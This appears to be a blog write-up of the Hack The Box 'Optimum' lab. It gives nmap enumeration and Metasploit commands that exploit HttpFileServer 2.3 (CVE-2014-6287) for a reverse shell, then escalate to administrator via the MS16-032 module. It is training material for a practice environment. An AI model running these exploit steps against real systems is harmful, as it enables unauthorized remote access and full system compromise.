---
layout: post
title: HTB - Optimum Writeup
date: 2019-03-10
image: '/images/posts/htb/optimum/optimum.jpg'
categories: ["writeups"]
tags: ["writeups", "optimum", "htb"]
---

* Box: Optimum
  - Difficulty: Easy
  - Points: 20
  - Release: 18 Mar 2017
  - IP: 10.10.10.8


### Initial Enumeration

#### 1. Nmap Scanning

Starting with a scan of the target ip address:

`nmap -sC -sV -oA optimum.nmap 10.10.10.8`

The nmap scan shows only port 80 is open and the detected software is an outdated HttpFileServer 2.3.

<img src="/images/posts/htb/optimum/optimum1.jpg">

Accessing the webpage, we see it looks to be a file server used to access/archive files over the network. Let's look more into the HttpFileServer 2.3 version and investigate possible exploits.

The first serach reveals that this particular version has a remote command execution vulnerability
(CVE-2014-6287). Which conveniently, has a metasploit module available.

[CVE-2014-6287](https://www.exploit-db.com/exploits/39161)

### Exploitation

#### 2. Metasploit Module

Load up metasploit and simply load up the exploit for this CVE:

`use exploit/windows/http/rejetto_hfs_exec`<br>
`set RHOSTS 10.10.10.8`<br>
`set LHOSTS 10.10.14.9`<br>
`run`<br>

A shell will appear and you can find the user flag in the Desktop directory of the user "kostas".
The file will be named "**user.txt.txt**"

<img src="/images/posts/htb/optimum/optimum2.jpg">

<img src="/images/posts/htb/optimum/optimum3.jpg">


### Privilege Escalation

Now we have to get the root flag. Since we have a meterpreter session open, we can use local_exploit_suggester and look for possible vulnerabilities.

Simply run:

`use post/multi/recon/local_exploit_suggester` <br>
`set SESSION 1`<br>
`run`<br>

<img src="/images/posts/htb/optimum/optimum4.jpg">

We see 2 possible vulnerabilities. Trying the first doesn't work but this is because we are not in the admins group.
Trying the next one, logon_handle works for us.

`use windows/local/ms16_032_secondary_logon_handle_privesc`<br>
`set SESSION 1`<br>
`run`<br>

<img src="/images/posts/htb/optimum/optimum5.jpg">

The root flag is found at "C:\Users\Administrator\Desktop\root.txt"

<img src="/images/posts/htb/optimum/optimum6.jpg">
